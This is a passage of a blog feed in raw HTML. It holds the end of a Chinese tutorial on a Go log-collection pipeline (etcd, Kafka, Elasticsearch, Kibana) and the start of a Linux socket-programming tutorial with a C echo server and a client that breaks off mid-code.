class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line"><span class="keyword">status</span> <span class="built_in">tinyint</span> <span class="keyword">default</span> <span class="number">1</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>数据库创建成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span> show tables;</span><br><span class="line">+----------------------+</span><br><span class="line">| Tables_in_logcollect |</span><br><span class="line">+----------------------+</span><br><span class="line">| tbl_app_info         |</span><br><span class="line">| tbl_app_ip           |</span><br><span class="line">| tbl_log_info         |</span><br><span class="line">+----------------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>在前端主页面，项目列表对应<code>tbl_app_info</code>这张表，日志列表对应<code>tbl_log_info</code>这张表。<code>tbl_app_ip</code>这张表用来保存项目所在的<code>ip</code>地址。</p><h4 id="etcd"><a href="#etcd" class="headerlink" title="etcd"></a>etcd</h4><p>当我们申请好项目之后，就可以针对该项目所产生的日志进行收集。对于所要收集的日志配置信息，可以采用etcd进行存储。</p><p>例如我们可以在日志申请页写入所要收集的项目信息，前提是项目的名字必须在项目列表中是存在的，否则日志申请就会失败。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/2.png" alt="2"></p><p>etcd中获取key的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % etcdctl get /backend/logagent/config/10.100.163.201</span><br><span class="line">/backend/logagent/config/10.100.163.201</span><br><span class="line">[&#123;"logpath":"/Users/caoyifan/test.log","topic":"kafka_test"&#125;]</span><br></pre></td></tr></table></figure><h4 id="logAgent"><a href="#logAgent" class="headerlink" title="logAgent"></a>logAgent</h4><p>logAgent项目树结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">logAgent</span><br><span class="line">├── conf</span><br><span class="line">│   └── logAgent.conf</span><br><span class="line">├── kafka</span><br><span class="line">│   └── kafka.go</span><br><span class="line">├── logs</span><br><span class="line">│   └── my.log</span><br><span class="line">├── main</span><br><span class="line">│   ├── config.go</span><br><span class="line">│   ├── etcd.go</span><br><span class="line">│   ├── ip.go</span><br><span class="line">│   ├── log.go</span><br><span class="line">│   ├── main.go</span><br><span class="line">│   └── server.go</span><br><span class="line">├── tailf</span><br><span class="line">│   └── tail.go</span><br><span class="line">└── tools</span><br><span class="line">    └── SetConf</span><br><span class="line">        └── main.go</span><br></pre></td></tr></table></figure><p>其中每个文件的具体作用如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">logagent.conf :配置文件</span><br><span class="line">kafka.go:对kafka的操作，包括初始化kafka连接，以及给kafka发送消息</span><br><span class="line">my.log:产生的日志文件</span><br><span class="line">config.go:用于初始化读取配置文件中的内容，这里的配置文件加载是通过之前自己实现的配置文件热加载包处理的</span><br><span class="line">etcd.go:对etcd的操作，包括初始化etcd和监听etcd</span><br><span class="line">ip.go:获取本机所有的网卡ip，连接etcd</span><br><span class="line">log.go:日志的处理与序列化</span><br><span class="line">main.go: 初始化入口文件,与执行server的入口函数</span><br><span class="line">server.go:主要是tail 的相关操作，用于去读日志文件并将内容放到channel中</span><br><span class="line">tail.go: 用于去读日志文件</span><br><span class="line">SetConf.main.go:将设置的配置信息导入到etcd中</span><br></pre></td></tr></table></figure><p>进入main文件夹中，执行<code>go build</code>命令，之后执行<code>./main</code>启动项目，项目启动日志输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:32:11.007 [D]  get config from etcd success, [&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.985 [D]  导入日志成功&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:41:14.987 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  日志设置为[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  连接etcd成功</span><br><span class="line">2021/11/12 15:41:14.987 [D]  初始化etcd成功!</span><br><span class="line">2021/11/12 15:41:14.987 [D]  初始化tailf成功!</span><br><span class="line">2021/11/12 15:41:14.988 [D]  开始监控key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:41:14.997 [D]  初始化Kafka producer成功,地址为: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:41:14.997 [D]  初始化Kafka成功!</span><br></pre></td></tr></table></figure><p>可以看到，项目启动之后首先会从etcd中去获取前端写入etcd中的日志收集配置信息，之后etcd会持续监控key的变化，一旦有新的日志配置加入etcd中，就会更新配置文件，随后启动kafka准备从日志文件中读取日志信息。</p><p>测试日志文件读取</p><p>在<code>/Users/caoyifan</code>目录下创建<code>test.log</code>文件并尝试写入一些信息。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/3.png" alt="3"></p><p>发现kafka能够成功读取写入的文件信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:46:50.530 [D]  导入日志成功&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:46:50.533 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  日志设置为[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  连接etcd成功</span><br><span class="line">2021/11/12 15:46:50.533 [D]  初始化etcd成功!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  初始化tailf成功!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  开始监控key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:46:50.536 [D]  初始化Kafka producer成功,地址为: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:46:50.536 [D]  初始化Kafka成功!</span><br><span class="line">2021/11/12 15:47:21.637 [D]  read success, pid:0, offset:0, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.641 [D]  read success, pid:0, offset:1, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.642 [D]  read success, pid:0, offset:2, topic:kafka_test</span><br></pre></td></tr></table></figure><h4 id="logTransfer"><a href="#logTransfer" class="headerlink" title="logTransfer"></a>logTransfer</h4><p>确保已经启动了<code>kafka</code>和<code>ElasticSearch</code>和<code>kibana</code></p><p>进入main文件夹下，执行<code>go build</code>，输出日志如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro main % ./main  </span><br><span class="line">2021/11/17 17:51:56.784 [D]  初始化配置成功</span><br></pre></td></tr></table></figure><p>这个时候我们查看一下etcd中的日志配置信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % etcdctl get /backend/logagent/config/10.100.163.201</span><br><span class="line">/backend/logagent/config/10.100.163.201</span><br><span class="line">[&#123;"logpath":"/Users/caoyifan/kafka.log","topic":"kafka_log"&#125;]</span><br></pre></td></tr></table></figure><p>接着我们尝试向<code>kafka.log</code>中写入一些测试信息</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/4.png" alt="4"></p><p>这个时候我们查看<code>logAgent</code>中的日志，发现消息已经成功写入了kafka中</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/5.png" alt="5"></p><p>再查看<code>logTransfer</code>中的日志，发现已经成功收集到日志信息</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/6.png" alt="6"></p><h4 id="Kibana可视化"><a href="#Kibana可视化" class="headerlink" title="Kibana可视化"></a>Kibana可视化</h4><p>这个时候我们已经成功收集到了kafka中的消息，并且已经将消息写入到了ElasticSearch中，接下来我们配置一下Kibana查看收集到的相关信息。</p><p>首先我们在Kibana中创建索引，索引名就是我们在etcd中获取到的topic名称。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/7.png" alt="7"></p><p>通过postman，我们看到当前ElasticSearch中一共有三个索引，其中有一个就是我们创建好的<code>kafka_log</code>索引</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/8.png" alt="8"></p><p>最后我们在Kibana的Discover模块下，选择相应的索引，就可以看到索引下的相关数据。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/9.png" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;该项目主要分为三个部分，web端负责对etcd的写入以及从mysql读写数据进行展示。logAgent负责日志的收集，主要是通过tail从e
      
    
    </summary>
    
    
      <category term="Go" scheme="elssm.github.io/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>Linux网络编程</title>
    <link href="elssm.github.io/2021/11/02/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>elssm.github.io/2021/11/02/Linux网络编程/</id>
    <published>2021-11-02T01:24:29.000Z</published>
    <updated>2021-12-13T09:49:28.345Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h4><h5 id="套接字概念"><a href="#套接字概念" class="headerlink" title="套接字概念"></a>套接字概念</h5><p>在Linux环境下，Socket用于表示进程间网络通信的特殊文件类型。本质为内核借助缓冲区形成的伪文件。既然是文件，那么我们可以使用文件描述符引用套接字，与管道类似的，Linux系统将其封装成文件的目的是为了统一接口，使得读写套接字和读写文件的操作一致。区别是管道主要应用于本地进程间通信，而套接字多应用于网络进程间数据的传递。</p><p>在<code>TCP/IP</code>协议中，”IP地址+TCP或UDP端口号”唯一标识网络通讯中的一个进程，”IP地址+端口号”就对应一个<code>socket</code>。欲建立连接的两个进程各自有一个<code>socket</code>来标识，那么这两个<code>socket</code>组成的<code>socket pair</code>就唯一标识一个连接，因此可以用<code>Socket</code>来描述网络连接的一对一关系。</p><p>在网络通信中，套接字一定是成对出现的。一端的发送缓冲区对应对端的接受缓冲区。我们使用同一个文件描述符对应发送缓冲区和接收缓冲区。</p><h5 id="网络字节序"><a href="#网络字节序" class="headerlink" title="网络字节序"></a>网络字节序</h5><p>我们已经知道，内存中的多字节数据相对于内存地址有大端和小端之分，磁盘文件中的多字节数据相对于文件中的偏移地址也有大端小端之分，网络数据流同样有大端小端之分，那么如何定义网络数据流的地址呢。发送主机通常将发送缓冲区中的数据按内存地址从低到高的顺序发出。接收主机把从网络上接到的字节一次保存在接受缓冲区中，也是按内存地址从低到高的顺序保存，因此，网络数据流的地址应这样规定：先发出的数据是低地址，后发出的数据是高地址。</p><p><code>TCP/IP</code>协议规定，网络数据流应采用大端字节序，即低地址高字节，例如在<code>UDP</code>段格式中，地址<code>0-1</code>是16位的源端口号，如果这个端口号是<code>1000(0x3e8)</code>，则地址0是<code>0x03</code>，地址1时是<code>0xe8</code>，也就是先发<code>0x03</code>，再发<code>0xe8</code>，这16位在发送主机的缓冲区中也应该是低地址存<code>0x03</code>，高地址存<code>0xe8</code>，但是如果发送主机是小端字节序的，这16位被解释成<code>0xe803</code>，而不是1000。因此发送主机把1000填到发送缓冲区之前需要做字节序的转换。同样的，接收主机如果是小端字节序的，接到16位的源端口号也要做字节序的转换，如果主机是大端字节序的，发送和接收都不需要做转换。同理，32位的IP地址也要考虑网络字节序和主机字节序的问题。    </p><p>为了使网络程序具有可移植性，使同样的C代码在大端和小端计算机上编译后都能正常运行，可以调用以下库函数做网络字节序和主机字节序的转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htonl</span><span class="params">(<span class="keyword">uint32_t</span> hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htons</span><span class="params">(<span class="keyword">uint32_t</span> hostshort)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohl</span><span class="params">(<span class="keyword">uint32_t</span> netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohs</span><span class="params">(<span class="keyword">uint32_t</span> netshort)</span></span>;</span><br></pre></td></tr></table></figure><p>其中h标识<code>host</code>，n表示<code>network</code>，l表示32位长整数，s表示16位短整数。如果主机时小端字节序，这些函数将参数做相应的大小端转换然后返回，如果主机时大端字节序，这些函数不做转换，将参数原封不动的返回。</p><h5 id="IP地址转换函数"><a href="#IP地址转换函数" class="headerlink" title="IP地址转换函数"></a>IP地址转换函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> af,<span class="keyword">const</span> <span class="keyword">char</span> *src,<span class="keyword">void</span> *dst)</span></span>;</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">  af：AF_INET、AF_INET6</span><br><span class="line">  src：传入，IP地址（点分十进制）</span><br><span class="line">  dst：传出，转换后的网络字节序的IP地址</span><br><span class="line">返回</span><br><span class="line">  成功：<span class="number">1</span></span><br><span class="line">  异常：<span class="number">0</span> 说明src指向的不是一个有效的IP地址</span><br><span class="line">  失败：<span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="网络套接字函数"><a href="#网络套接字函数" class="headerlink" title="网络套接字函数"></a>网络套接字函数</h4><h5 id="socket函数"><a href="#socket函数" class="headerlink" title="socket函数"></a>socket函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">int socket(int domain,int type,int protocol) 创建一个套接字</span><br><span class="line">  </span><br><span class="line">domain：AF_INET、AF_INET6、AF_UNIX</span><br><span class="line">type：SOCK_STREAM、SOCK_DGRAM</span><br><span class="line">protocol：<span class="number">0</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：新套接字所对应的文件描述符</span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="bind函数"><a href="#bind函数" class="headerlink" title="bind函数"></a>bind函数</h5><p>给socket绑定一个地质结构(IP+port)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(<span class="number">8888</span>)</span><br><span class="line">  addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">addr：(struct sockaddr *)&amp;addr</span><br><span class="line">addrlen：<span class="keyword">sizeof</span>(addr)地址结构的大小</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h5><p>设置同时与服务器建立连接的上限数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">backlog：上限数值，最大<span class="number">128</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="accept函数"><a href="#accept函数" class="headerlink" title="accept函数"></a>accept函数</h5><p>阻塞等待客户端建立连接，成功的话，返回一个与客户端成功连接的socket文件描述符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd,struct socketaddr *addr,<span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">addr：传出参数，成功与服务器建立连接的那个客户端的地址结构(IP+port)</span><br><span class="line">  <span class="keyword">socklen_t</span> clit_addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">addrlen：传入传出。入：addr的大小。出：客户端addr实际大小</span><br><span class="line">  </span><br><span class="line">返回值</span><br><span class="line">  成功：能与服务器进行数据通信的socket对应的文件描述符</span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="connect函数"><a href="#connect函数" class="headerlink" title="connect函数"></a>connect函数</h5><p>使用现有的socket与服务器建立连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">addr：传入参数。服务器的地址结构</span><br><span class="line">addrlen：服务器的地址结构的大小</span><br><span class="line">  </span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="实现server端"><a href="#实现server端" class="headerlink" title="实现server端"></a>实现server端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd = <span class="number">0</span>,cfd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ],client_IP[<span class="number">1024</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>,<span class="title">clit_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clit_addr_len;</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">lfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(lfd == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bind(lfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"></span><br><span class="line">listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clit_addr_len = <span class="keyword">sizeof</span>(clit_addr);</span><br><span class="line">cfd = accept(lfd,(struct sockaddr *)&amp;clit_addr,&amp;clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"accept error"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client ip:%s port:%d\n"</span>,inet_ntop(AF_INET,&amp;clit_addr.sin_addr.s_addr,client_IP,<span class="keyword">sizeof</span>(client_IP)),ntohs(clit_addr.sin_port));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">close(lfd);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实现client端"><a href="#实现client端" class="headerlink" title="实现client端"></a>实现client端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span 